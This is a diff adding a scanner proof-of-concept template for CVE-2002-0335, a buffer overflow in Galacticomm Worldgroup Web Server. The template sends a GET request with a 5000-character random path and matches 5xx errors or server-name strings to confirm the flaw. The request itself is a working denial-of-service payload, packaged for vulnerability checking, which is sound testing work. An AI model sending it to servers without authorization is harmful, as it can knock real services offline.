@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "Galacticomm Worldgroup Web Server 3.20 及更早版本存在缓冲区溢出漏洞，发送超长 HTTP GET 请求可导致服务拒绝"
+id = "POC-AVE-2002-0276"
+name = "CVE-2002-0335 PoC"
+severity = "high"
+tags = ["ave-2002-0276"]
+vuln_id = [
+    "CVE-2002-0335",
+    "AVE-2002-0276",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{RandStr(5000)}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status_code"
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Galacticomm",
+    "Worldgroup",
+    "Server Error",
+]
